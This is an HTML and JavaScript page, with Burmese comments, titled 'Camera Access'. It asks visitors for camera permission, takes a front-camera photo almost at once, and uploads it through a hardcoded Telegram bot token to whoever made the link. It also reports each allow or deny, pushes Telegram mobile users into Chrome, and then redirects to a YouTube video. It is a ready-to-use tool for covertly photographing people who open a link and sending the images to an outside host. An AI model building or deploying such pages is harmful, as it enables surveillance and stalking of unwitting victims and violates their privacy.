<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Camera Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 30px;
            text-align: center;
        }
        h1 { color: #667eea; margin-bottom: 10px; font-size: 24px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        video { width: 100%; border-radius: 10px; background: #000; margin-bottom: 15px; display: none; }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }
        .status.info { background: #d1ecf1; color: #0c5460; display: block; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .redirect-note {
            background: #fff3cd;
            color: #856404;
            padding: 10px;
            border-radius: 10px;
            margin-top: 15px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Camera Access</h1>
        <div class="subtitle">Please allow camera to continue</div>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display: none;"></canvas>
        
        <div id="status" class="status info">📷 Initializing...</div>
        <div id="redirectNote" class="redirect-note" style="display: none;">⏳ Redirecting to YouTube after photo...</div>
        <div class="footer">Photo will be sent to owner automatically</div>
    </div>

    <script>
        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        let stream = null;
        let photoTaken = false;
        let redirectDone = false;
        
        const video = document.getElementById('video');
        const statusDiv = document.getElementById('status');
        const redirectNote = document.getElementById('redirectNote');
        
        // Telegram browser စစ်ဆေးပြီး Chrome ကို Auto ခေါ်မယ်
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        if (isTelegram && isMobile) {
            // Telegram ဆိုရင် Chrome ကို Auto ခေါ်မယ်
            const currentUrl = window.location.href;
            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
        }
        
        async function initCamera() {
            if (!OWNER_ID) {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Invalid link. No owner ID found.';
                return;
            }
            
            try {
                statusDiv.className = 'status info';
                statusDiv.innerHTML = '📷 Requesting camera permission... <span class="loading"></span>';
                
                // Camera ခေါ်မယ်
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.style.display = 'block';
                video.srcObject = stream;
                
                statusDiv.innerHTML = '✅ Camera ready! Taking photo instantly...';
                
                // Allow နိပ်တာနဲ့ ချက်ချင်းပုံရိုက်မယ် (0.5 စက္ကန့်)
                setTimeout(() => {
                    takePhotoAndSend();
                }, 500);
                
                // Owner ကို အကြောင်းကြားမယ်
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: `👤 Someone opened camera link and ALLOWED!\n\n🕐 Time: ${new Date().toLocaleString()}`
                    })
                }).catch(e => console.log(e));
                
            } catch (err) {
                console.error('Camera error:', err);
                statusDiv.className = 'status error';
                
                if (err.name === 'NotAllowedError') {
                    statusDiv.innerHTML = '❌ Camera DENIED! Please refresh and click Allow.';
                } else if (err.name === 'NotFoundError') {
                    statusDiv.innerHTML = '❌ No camera found on this device.';
                } else {
                    statusDiv.innerHTML = '❌ Error: Please use Chrome browser.';
                }
                
                if (OWNER_ID) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: OWNER_ID,
                            text: `❌ Camera DENIED!\n\n🕐 Time: ${new Date().toLocaleString()}`
                        })
                    }).catch(e => console.log(e));
                }
            }
        }
        
        async function takePhotoAndSend() {
            if (photoTaken) return;
            photoTaken = true;
            
            statusDiv.innerHTML = '📸 Taking photo... <span class="loading"></span>';
            
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                statusDiv.innerHTML = '📤 Sending photo to owner... <span class="loading"></span>';
                
                const formData = new FormData();
                formData.append('chat_id', OWNER_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `📸 Photo captured!\n\n🕐 Time: ${new Date().toLocaleString()}`);
                
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        statusDiv.className = 'status success';
                        statusDiv.innerHTML = '✅ Photo sent successfully! Redirecting to YouTube...';
                        
                        redirectNote.style.display = 'block';
                        
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                        
                        // ပုံပို့ပြီးရင် YouTube ကို Auto ခေါ်မယ်
                        setTimeout(() => {
                            if (!redirectDone) {
                                redirectDone = true;
                                window.location.href = YOUTUBE_URL;
                            }
                        }, 1500);
                        
                    } else {
                        throw new Error('Send failed');
                    }
                } catch (err) {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Failed to send photo. Redirecting anyway...';
                    
                    setTimeout(() => {
                        if (!redirectDone) {
                            redirectDone = true;
                            window.location.href = YOUTUBE_URL;
                        }
                    }, 2000);
                }
            }, 'image/jpeg', 0.8);
        }
        
        // Start
        if (!isTelegram || !isMobile) {
            initCamera();
        }
        
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
